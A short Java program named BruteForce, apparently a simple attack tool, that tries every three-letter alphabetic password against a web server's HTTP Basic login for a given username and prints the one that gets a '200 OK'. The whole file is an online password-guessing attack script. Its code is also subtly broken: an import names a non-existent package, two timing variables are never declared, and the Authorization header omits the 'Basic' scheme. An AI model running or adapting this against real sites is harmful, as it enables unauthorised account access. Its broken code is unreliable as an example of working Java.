import java.io.*;
import java.util.*;
import java.net.*;
import java.misc.BASE64Encoder;

public class BruteForce
{
  public BruteForce()
  {
  }

  public static void main(String[] args)
  {
    try
    {
        if (args.length != 2 )
        {
            System.out.println("Usage: java BruteForce <URL> <UserName>");
            System.exit(1);
        }

         timeStart = System.currentTimeMillis();

        String strPass = applyBruteForce (args[0], args[1]);

         timeEnd = System.currentTimeMillis();

        System.out.println("\n\n\n\n\tPass Cracked is: " + strPass);
        System.out.println("\tTime taken is (sec):" + String.valueOf((timeEnd - timeStart)/1000));

    }
    catch(Exception e)
    {
      e.printStackTrace();
    }
  }

  static String applyBruteForce (String URL, String UserName)
  {
      


      String strPass = "";

      char ch1, ch2, ch3;

      System.out.print("\n\n\n Applying BruteForce Attack:     ");

      for (ch1 = 'A' ; ch1 <= 'z' ; ch1 ++)
      {
          if ( ch1 > 'Z' && ch1 < 'a' )
              ch1 = 'a';

          for (ch2 = 'A' ; ch2 <= 'z' ; ch2 ++)
          {
              if ( ch2 > 'Z' && ch2 < 'a' )
                  ch2 = 'a';

              for (ch3 = 'A' ; ch3 <= 'z' ; ch3 ++)
              {
                  if ( ch3 > 'Z' && ch3 < 'a' )
                      ch3 = 'a';

                  strPass = String.valueOf(ch1) + String.valueOf(ch2) + String.valueOf(ch3);

                  
                  System.out.print("\b\b\b" + strPass );
                  

                  boolean boolResult = applyPass ( URL, UserName, strPass );

                  if (boolResult)
                  {
                      return strPass;
                  }

              }
          }
      }

      return "Could not find match";
  }

  private static boolean applyPass (String strURL, String strUserName, String strPass )
  {
        BASE64Encoder myEncoder = new BASE64Encoder ();

        try
        {
            String str = strUserName + ":" + strPass;

            String strEncode = myEncoder.encode(str.getBytes());

            URL url = new URL (strURL);

            URLConnection urlConn = url.openConnection();

            urlConn.setRequestProperty ("Authorization", " " + strEncode);

            urlConn.connect();

            String strReply = urlConn.getHeaderField(0);

            if ( strReply.trim().equalsIgnoreCase("HTTP/1.1 200 OK") )
            {
                return true;
            }
        }
        catch (Exception e)
        {
            e.printStackTrace ();
        }

        return false;
  }
}
